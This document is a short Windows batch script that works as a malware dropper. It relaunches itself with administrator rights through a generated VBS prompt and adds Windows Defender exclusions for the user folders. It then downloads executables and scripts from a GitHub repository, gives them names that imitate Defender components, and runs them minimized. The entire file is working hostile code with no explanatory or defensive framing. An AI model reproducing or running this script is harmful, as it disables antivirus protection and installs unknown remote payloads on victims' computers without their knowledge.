@echo off

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"

powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdStmp.exe' -OutFile '%USERPROFILE%\AppData\Roaming\MpCmdStmp.exe'"
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\run.bat'"
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/cmd.ps1' -OutFile '%USERPROFILE%\cmd.ps1'"

cd "%USERPROFILE%\AppData\Roaming\"
start /min "" "MpCmdStmp.exe"

cd "%USERPROFILE%
start /min "" "run.bat"
powershell -file cmd.ps1
